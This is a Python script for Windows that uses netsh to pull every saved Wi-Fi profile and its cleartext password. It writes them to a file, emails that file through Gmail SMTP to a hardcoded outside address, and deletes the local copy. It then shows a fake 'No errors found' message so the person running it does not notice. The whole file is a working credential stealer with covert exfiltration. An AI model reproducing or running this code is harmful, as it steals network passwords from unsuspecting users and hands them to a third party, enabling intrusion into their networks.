import os
import smtplib 
import socket
import tkinter
from email.message import EmailMessage 
from tkinter import messagebox

def send_to_gmail(file):
    msg = EmailMessage()
    msg['Subject'] = 'Here you go'
    msg['From'] = 'OSINT48@gmail.com'
    msg['To'] = 'OSINT48@gmail.com'
    msg.set_content('LIST OF WIFI PASSWORDS')

    with open(('C:\\Users\\' + os.environ['USERNAME'] + f'\\{file}'), 'rb') as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('OSINT48@gmail.com', '')
        smtp.send_message(msg)

def main():
    try:
        profiles = []
        paswords = []
        file = open('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt', 'w')

        data = os.popen('netsh wlan show profile').read().split('\n')
        for i in data:
            if ':' in i:
                prof = i.split(':')[1]
                if prof != '':
                    profiles.append(prof)
            
        for i in profiles:
            pass_data = os.popen(f'netsh wlan show profile {i} key=clear').read().split()
            for j in range(len(pass_data)):
                if 'Key' in pass_data[j] and 'Content' in pass_data[j+1]:
                    paswords.append(pass_data[j+3])

        for i in range(len(profiles)):
            file.write(profiles[i] + ' : ' + paswords[i] + '\n')
        file.close()

        send_to_gmail('file.txt')
        os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt')
        root = tkinter.Tk()
        root.withdraw()
        messagebox.showinfo('Congratulations', 'No errors found')
        root.destroy()

    except socket.gaierror:
        root = tkinter.Tk()
        root.withdraw()
        messagebox.showerror('Error', 'No internet connection')
        root.destroy()
        os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt')


if __name__ == '__main__':
    main()